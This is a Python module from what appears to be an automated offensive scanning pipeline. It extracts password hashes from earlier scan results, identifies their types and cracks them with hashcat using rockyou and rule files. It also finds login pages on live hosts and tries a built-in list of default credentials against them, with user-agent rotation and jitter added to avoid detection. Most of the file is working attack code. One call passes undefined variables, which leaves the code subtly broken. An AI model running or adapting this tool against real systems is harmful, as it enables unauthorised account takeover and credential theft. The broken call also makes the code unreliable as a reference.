#!/usr/bin/env python3
# modules/step35_hashcrack.py — Hash Cracking + Credential Testing V7
# NEW MODULE: hashcat integration + credential testing
# Source: hashcat book + CEH v13 Practical Lab + Coding for Pentester
# MilkyWay Intelligence | Author: Sharlix + M7AI

import os, re, shutil, hashlib, subprocess
from core.utils import safe_read

# ── Hash type detection (from hashcat book) ───────────────────────────────────
HASH_PATTERNS = [
    (re.compile(r'^[a-f0-9]{32}$',          re.I), "0",   "MD5"),
    (re.compile(r'^[a-f0-9]{40}$',          re.I), "100", "SHA1"),
    (re.compile(r'^[a-f0-9]{56}$',          re.I), "200", "SHA224"),
    (re.compile(r'^[a-f0-9]{64}$',          re.I), "1400","SHA256"),
    (re.compile(r'^[a-f0-9]{96}$',          re.I), "10800","SHA384"),
    (re.compile(r'^[a-f0-9]{128}$',         re.I), "1700","SHA512"),
    (re.compile(r'^\$2[ayb]\$.{56}$',       re.I), "3200","bcrypt"),
    (re.compile(r'^\$6\$.{8,}\$.{86}$',     re.I), "1800","sha512crypt"),
    (re.compile(r'^\$5\$.{8,}\$.{43}$',     re.I), "7400","sha256crypt"),
    (re.compile(r'^\$1\$.{8}\$.+$',         re.I), "500", "md5crypt"),
    (re.compile(r'^[a-f0-9]{32}:[a-f0-9]+$',re.I), "10",  "md5:salt"),
    (re.compile(r'^sha1\$[^:]+\$[a-f0-9]+$',re.I), "114", "Django SHA1"),
    (re.compile(r'^pbkdf2_sha256\$.+',       re.I), "10000","Django PBKDF2"),
    (re.compile(r'^\$apr1\$.+\$.+$',        re.I), "1600","APR-MD5"),
    (re.compile(r'^\{SHA\}[A-Za-z0-9+/=]+$',re.I), "101", "LDAP SHA"),
    (re.compile(r'^[A-Za-z0-9./]{13}$',     re.I), "1500","DES-crypt"),
    (re.compile(r'^AAAA[A-Za-z0-9+/=]{20,}$',re.I),"1000","NTLM"),
    (re.compile(r'^[a-f0-9]{16}$',          re.I), "900", "MD4"),
]

# ── Wordlists (from hashcat book — rockyou first) ────────────────────────────
WORDLISTS = [
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/wordlists/rockyou.txt.gz",
    "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt",
    "/usr/share/seclists/Passwords/Common-Credentials/best1050.txt",
    "/usr/share/wordlists/metasploit/password.lst",
    "/usr/share/wordlists/fasttrack.txt",
]

# ── Rules (from hashcat book — combinator + rule attacks) ─────────────────────
HASHCAT_RULES = [
    "/usr/share/hashcat/rules/best64.rule",
    "/usr/share/hashcat/rules/rockyou-30000.rule",
    "/usr/share/hashcat/rules/d3ad0ne.rule",
]

# ── Default credentials to test (from CEH v13 lab) ───────────────────────────
DEFAULT_CREDS = [
    ("admin",     "admin"),
    ("admin",     "password"),
    ("admin",     "admin123"),
    ("admin",     "1234"),
    ("root",      "root"),
    ("root",      "toor"),
    ("admin",     ""),
    ("test",      "test"),
    ("user",      "user"),
    ("guest",     "guest"),
    ("admin",     "letmein"),
    ("admin",     "changeme"),
    ("admin",     "administrator"),
    ("webmaster", "webmaster"),
]

# ── Hash extraction patterns from HTTP responses ──────────────────────────────
HASH_IN_RESPONSE = [
    (re.compile(r'"password_hash"\s*:\s*"([a-f0-9$./]{16,})"', re.I), "password_hash"),
    (re.compile(r'"hash"\s*:\s*"([a-f0-9$./]{16,})"',           re.I), "hash"),
    (re.compile(r'"md5"\s*:\s*"([a-f0-9]{32})"',                re.I), "md5"),
    (re.compile(r'"sha1"\s*:\s*"([a-f0-9]{40})"',               re.I), "sha1"),
    (re.compile(r'"sha256"\s*:\s*"([a-f0-9]{64})"',             re.I), "sha256"),
]


class Step35Hashcrack:
    """
    Hash Cracking + Credential Testing.
    hashcat book methodology:
    1. Extract hashes from scan findings
    2. Identify hash type automatically
    3. Dictionary attack with rockyou
    4. Rule-based attack for better coverage
    5. Test default credentials on login pages
    """

    def __init__(self, pipeline):
        self.p = pipeline

    def run(self):
        p     = self.p
        out   = p.files.get("hashcrack_results",
                             f"{p.out}/{p.prefix}_hashcrack.txt")
        live  = safe_read(p.files.get("fmt_url",""))[:10]
        found = 0

        p.log.info("Hashcrack V7: hash extraction + hashcat + default cred test")

        # Phase 1: Extract hashes from previous findings
        hashes = self._extract_hashes_from_findings(p)
        if hashes:
            p.log.info(f"  Found {len(hashes)} hashes to crack")
            r = self._crack_with_hashcat(hashes, out)
            found += r

        # Phase 2: Test default credentials on login pages
        login_pages = self._find_login_pages(live)
        p.log.info(f"  Login pages found: {len(login_pages)}")
        for url in login_pages[:10]:
            r = self._test_default_creds(url, out)
            found += r
            if r: p.bypass.jitter()

        # Phase 3: Hash found in API responses (from IDOR/SQLi results)
        r = self._check_api_responses_for_hashes(p, out)
        found += r

        p.log.success(f"Hashcrack V7: {found} findings")

    # ── Phase 1: Extract hashes from findings ────────────────────────────────
    def _extract_hashes_from_findings(self, p) -> list:
        """Extract hash strings from all result files."""
        hashes = []
        hash_re = re.compile(
            r'([a-f0-9]{32}|[a-f0-9]{40}|[a-f0-9]{56}|[a-f0-9]{64}|'
            r'\$2[ayb]\$[0-9]+\$[A-Za-z0-9./]{53}|'
            r'\$6\$[A-Za-z0-9./]+\$[A-Za-z0-9./]+|'
            r'\$5\$[A-Za-z0-9./]+\$[A-Za-z0-9./]+)',
            re.I
        )
        for key, fpath in p.files.items():
            if not fpath.endswith(".txt"): continue
            if not os.path.isfile(fpath): continue
            content = ""
            try:
                content = open(fpath, errors="ignore").read()
            except Exception:
                continue
            for m in hash_re.finditer(content):
                h = m.group(0)
                htype, hid = self._identify_hash(h)
                if htype:
                    hashes.append((h, htype, hid))
        return list({h[0]: h for h in hashes}.values())[:20]

    def _identify_hash(self, hash_str: str) -> tuple:
        """Identify hash type from hashcat book patterns."""
        for pattern, hid, htype in HASH_PATTERNS:
            if pattern.match(hash_str.strip()):
                return htype, hid
        return "", ""

    # ── Phase 2: Hashcat cracking ─────────────────────────────────────────────
    def _crack_with_hashcat(self, hashes: list, out: str) -> int:
        """
        hashcat book: dictionary attack (-a 0) with rockyou,
        then rule-based attack for better coverage.
        """
        if not shutil.which("hashcat"):
            self.p.log.warn("  hashcat not installed — install with: apt install hashcat")
            return 0

        wordlist = self._get_wordlist()
        if not wordlist:
            self.p.log.warn("  No wordlist found — install: apt install wordlists")
            return 0

        # Group hashes by type
        by_type = {}
        for h, htype, hid in hashes:
            by_type.setdefault(hid, []).append((h, htype))

        found = 0
        for hid, hash_list in by_type.items():
            # Write hashes to temp file
            tmpfile = f"/tmp/m7hashes_{hid}.txt"
            with open(tmpfile,"w") as f:
                f.write("\n".join(h for h,_ in hash_list))

            outfile = f"/tmp/m7cracked_{hid}.txt"
            htype   = hash_list[0][1]

            self.p.log.info(f"  Cracking {len(hash_list)} {htype} hashes...")

            # Dictionary attack (hashcat book -a 0)
            try:
                result = subprocess.run([
                    "hashcat", "-m", hid, "-a", "0",
                    tmpfile, wordlist,
                    "-o", outfile, "--outfile-format=2",
                    "--quiet", "--potfile-disable",
                    "--runtime=120",  # 2 min max per type
                ], capture_output=True, text=True, timeout=140)

                if os.path.isfile(outfile):
                    cracked = open(outfile).read().strip()
                    if cracked:
                        for line in cracked.split("\n"):
                            detail = f"Hash cracked ({htype}): {line[:80]}"
                            with open(out,"a") as f:
                                f.write(f"CRACKED: {detail}\n")
                            self.p.add_finding("critical","HASH_CRACKED",
                                               "credential-database", detail, "hashcat", response=response, payload=payload)
                            found += 1
            except Exception as e:
                self.p.log.warn(f"  hashcat error: {e}")

            # Cleanup
            for f in [tmpfile, outfile]:
                try: os.unlink(f)
                except: pass

        return found

    # ── Phase 3: Default credentials ─────────────────────────────────────────
    def _test_default_creds(self, url: str, out: str) -> int:
        """
        CEH v13 Practical Lab: test default credentials on login pages.
        """
        import urllib.request, urllib.error
        found = 0

        # Detect form fields
        form = self._detect_form(url)
        if not form: return 0

        user_field  = form.get("user_field","username")
        pass_field  = form.get("pass_field","password")
        action_url  = form.get("action", url)
        baseline_st = form.get("baseline_status",200)
        baseline_body = form.get("baseline_body","")

        for username, password in DEFAULT_CREDS[:10]:
            try:
                data = urllib.parse.urlencode({
                    user_field: username,
                    pass_field: password,
                }).encode()
                req  = urllib.request.Request(
                    action_url,
                    data=data,
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": self.p.bypass.ua(),
                    },
                    method="POST"
                )
                resp = urllib.request.urlopen(req, timeout=8)
                body = resp.read(20000).decode("utf-8","ignore")
                st   = resp.status
            except urllib.error.HTTPError as e:
                st, body = e.code, ""
            except Exception:
                continue

            # Success indicators (from CEH labs)
            success = (
                st in (200,302) and
                any(x in body.lower() for x in
                    ["dashboard","logout","welcome","profile","account",
                     "success","logged in","sign out"]) and
                "invalid" not in body.lower()[:500] and
                "incorrect" not in body.lower()[:500]
            )

            if success:
                detail = (f"Default credentials work: {username}:{password} "
                          f"on {url}")
                with open(out,"a") as f:
                    f.write(f"DEFAULT_CREDS: {url} | {detail}\n")
                self.p.add_finding("critical","DEFAULT_CREDENTIALS",
                                   url, detail, "cred-tester",
                                   payload=f"{username}:{password}")
                found += 1
                break

        return found

    def _detect_form(self, url: str) -> dict:
        """Detect login form fields."""
        try:
            import urllib.request
            req  = urllib.request.Request(
                url, headers={"User-Agent": self.p.bypass.ua()})
            resp = urllib.request.urlopen(req, timeout=8)
            body = resp.read(50000).decode("utf-8","ignore")
        except Exception:
            return {}

        # Common user field names
        user_re = re.compile(
            r'name=["\']([^"\']*(?:user|email|login|username|mail)[^"\']*)["\']',
            re.I)
        pass_re = re.compile(
            r'name=["\']([^"\']*(?:pass|password|pwd|secret)[^"\']*)["\']',
            re.I)
        action_re = re.compile(r'<form[^>]+action=["\']([^"\']+)["\']', re.I)

        user_m   = user_re.search(body)
        pass_m   = pass_re.search(body)
        action_m = action_re.search(body)

        if not (user_m or pass_m):
            return {}

        action = action_m.group(1) if action_m else url
        if action.startswith("/"):
            from urllib.parse import urlparse
            parsed = urlparse(url)
            action = f"{parsed.scheme}://{parsed.netloc}{action}"

        return {
            "user_field":     user_m.group(1)   if user_m   else "username",
            "pass_field":     pass_m.group(1)   if pass_m   else "password",
            "action":         action,
            "baseline_body":  body,
            "baseline_status":resp.status,
        }

    # ── Phase 4: Hashes in API responses ─────────────────────────────────────
    def _check_api_responses_for_hashes(self, p, out: str) -> int:
        found = 0
        for key, fpath in p.files.items():
            if not fpath.endswith(".txt"): continue
            if not os.path.isfile(fpath): continue
            try:
                content = open(fpath, errors="ignore").read()
            except Exception:
                continue
            for pat, field in HASH_IN_RESPONSE:
                for m in pat.finditer(content):
                    h     = m.group(1)
                    htype, _ = self._identify_hash(h)
                    if htype:
                        detail = (f"Hash in API response ({field}={h[:20]}...) "
                                  f"in {os.path.basename(fpath)}")
                        with open(out,"a") as f:
                            f.write(f"HASH_EXPOSED: {detail}\n")
                        p.add_finding("high","HASH_EXPOSED","api-response",
                                      detail,"hash-detector")
                        found += 1
        return found

    def _find_login_pages(self, live: list) -> list:
        """Find login pages from live hosts."""
        login_paths = [
            "/login","/signin","/auth/login","/api/login",
            "/admin/login","/user/login","/account/login",
            "/wp-login.php","/admin","/panel",
        ]
        found = []
        import urllib.request, urllib.error
        for host in live[:5]:
            host = host.rstrip("/")
            for path in login_paths:
                url = host + path
                try:
                    req  = urllib.request.Request(
                        url, headers={"User-Agent": self.p.bypass.ua()})
                    resp = urllib.request.urlopen(req, timeout=6)
                    body = resp.read(10000).decode("utf-8","ignore")
                    if resp.status == 200 and any(
                        x in body.lower() for x in
                        ["password","login","sign in","username","email"]
                    ):
                        found.append(url)
                except Exception:
                    pass
        return found

    def _get_wordlist(self) -> str:
        for wl in WORDLISTS:
            if os.path.isfile(wl):
                return wl
        return ""

import urllib.parse
